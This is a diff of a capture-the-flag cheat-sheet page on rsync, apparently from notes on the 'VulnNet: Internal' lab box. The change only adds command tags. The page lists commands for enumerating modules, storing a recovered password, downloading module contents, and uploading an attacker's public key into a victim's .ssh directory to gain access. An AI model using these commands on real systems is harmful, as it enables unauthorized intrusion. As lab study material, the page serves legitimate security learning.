@@ -5,6 +5,7 @@ File-synchronization tool that doubles as a transport. When the server runs `rsy
 ## Commands Used
 
 ### List remote modules
+<!-- cmd: linux -->
 ```bash
 rsync --list-only rsync://$TARGET/
 rsync --list-only rsync://rsync-connect@$TARGET/
@@ -14,6 +15,7 @@ Used on: **VulnNet: Internal**
 enumerated `files` module.
 
 ### Prepare a password file (required by `--password-file`)
+<!-- cmd: linux -->
 ```bash
 echo "Hcg3HP67@TW@Bc72v" > /tmp/rsync.pass
 chmod 600 /tmp/rsync.pass
@@ -21,6 +23,7 @@ chmod 600 /tmp/rsync.pass
 Used on: **VulnNet: Internal**
 
 ### Download (mirror) a module locally
+<!-- cmd: linux -->
 ```bash
 rsync -av --password-file=/tmp/rsync.pass \
   rsync-connect@$TARGET::files ./rsync_files/
@@ -36,6 +39,7 @@ Flags:
 - `-n` / `--dry-run` — preview
 
 ### Upload (write) into a module
+<!-- cmd: linux -->
 ```bash
 rsync --password-file=/tmp/rsync.pass authorized_keys \
   rsync://rsync-connect@$TARGET/files/sys-internal/.ssh/
@@ -46,6 +50,7 @@ dropped the attacker's pubkey as `authorized_keys` in the victim user's `.ssh/`,
 
 ### Equivalent URL forms
 Both of these work:
+<!-- cmd: linux -->
 ```bash
 rsync -av --password-file=/tmp/rsync.pass rsync-connect@$TARGET::files/path/ ./local/
 rsync -av --password-file=/tmp/rsync.pass rsync://rsync-connect@$TARGET/files/path/ ./local/
